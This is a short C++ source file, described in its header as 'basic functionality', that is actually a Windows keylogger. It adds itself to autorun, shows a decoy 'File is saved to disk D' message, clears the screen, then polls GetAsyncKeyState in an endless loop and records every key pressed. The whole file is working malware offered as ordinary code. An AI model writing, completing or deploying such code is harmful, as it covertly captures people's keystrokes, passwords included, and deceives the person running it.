#include "basic_functions.h"

/*******************************************************************/

/* Date: 10.06.2018                                                */

/* Developer: Artem Gord1728                                       */

/* Copyright: 2018 Artem Gord1728. All rights reserved.            */

/* Description: Code with basic functionality                      */

/*******************************************************************/







int main()
{
	setlocale(LC_ALL, "ru");

	char key;

	K_Logger keyLog;

	keyLog.AddToAutorun();
	
	cout << "File is saved to disk D\nWait..." << endl;
	Sleep(1000);
	system("cls");

	while (true)
	{
		Sleep(10);
		for (key = 8; key <= 250; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				keyLog.SaveSymbol(key);
			}
		}
	}
	system("pause");
	return 0;
}